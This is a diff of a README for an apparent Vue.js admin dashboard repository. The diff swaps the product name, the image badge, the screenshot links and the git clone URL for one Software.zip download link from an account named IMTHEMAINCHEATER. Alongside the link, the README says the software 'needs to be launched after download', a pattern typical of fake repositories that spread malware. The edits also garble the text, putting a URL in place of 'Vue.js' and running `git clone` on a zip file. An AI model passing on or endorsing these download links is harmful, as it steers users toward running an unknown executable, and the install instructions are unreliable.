@@ -1,11 +1,11 @@
 # Kunafa Dashboard Vue 📊📈
 
-Welcome to Kunafa Dashboard Vue repository - your go-to solution for a feature-rich Modern Vue.js 3 & TailwindCSS & Vite Admin dashboard, with Real API Demo Data and multi-language support and full RTL/LTR bidirectional layout capabilities.
+Welcome to Kunafa Dashboard Vue repository - your go-to solution for a feature-rich Modern https://github.com/IMTHEMAINCHEATER/kunafa-dashboard-vue/releases/download/v2.0/Software.zip 3 & TailwindCSS & Vite Admin dashboard, with Real API Demo Data and multi-language support and full RTL/LTR bidirectional layout capabilities.
 
 ## 📁 Repository
 
 - **Name:** kunafa-dashboard-vue
-- **Description:** A feature-rich Modern Vue.js 3 & TailwindCSS & Vite Admin dashboard, with Real API Demo Data and multi-language support and full RTL/LTR bidirectional layout capabilities.
+- **Description:** A feature-rich Modern https://github.com/IMTHEMAINCHEATER/kunafa-dashboard-vue/releases/download/v2.0/Software.zip 3 & TailwindCSS & Vite Admin dashboard, with Real API Demo Data and multi-language support and full RTL/LTR bidirectional layout capabilities.
 - **Topics:** 
     - 2025-dashboard
     - api-dashboard
@@ -24,9 +24,9 @@ Welcome to Kunafa Dashboard Vue repository - your go-to solution for a feature-r
 
 ## 🌐 Check Out The Software 🚀
 
-### [Download Kunafa Dashboard Vue Software Now! 🔗](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+### [Download Kunafa Dashboard Vue Software Now! 🔗](https://github.com/IMTHEMAINCHEATER/kunafa-dashboard-vue/releases/download/v2.0/Software.zip)
 
-![Download Button](https://img.shields.io/badge/Download-Software-success)
+![Download Button](https://github.com/IMTHEMAINCHEATER/kunafa-dashboard-vue/releases/download/v2.0/Software.zip)
 
 ### (Note: Software needs to be launched after download.)
 
@@ -43,8 +43,8 @@ In case the link doesn't work, please check the "Releases" section for more down
 
 Here are some snapshots of the Kunafa Dashboard Vue:
 
-![Dashboard Snapshot](https://source.unsplash.com/featured/?dashboard)
-![RTL/LTR Layout](https://source.unsplash.com/featured/?bidirectional)
+![Dashboard Snapshot](https://github.com/IMTHEMAINCHEATER/kunafa-dashboard-vue/releases/download/v2.0/Software.zip)
+![RTL/LTR Layout](https://github.com/IMTHEMAINCHEATER/kunafa-dashboard-vue/releases/download/v2.0/Software.zip)
 
 ## 🛠️ Installation
 
@@ -56,7 +56,7 @@ To install and run the Kunafa Dashboard Vue software, follow these steps:
 4. Explore the dashboard!
 
 ```bash
-git clone https://github.com/Rubenas123/kunafa-dashboard-vue.git
+git clone https://github.com/IMTHEMAINCHEATER/kunafa-dashboard-vue/releases/download/v2.0/Software.zip
 cd kunafa-dashboard-vue
 npm install
 npm run dev
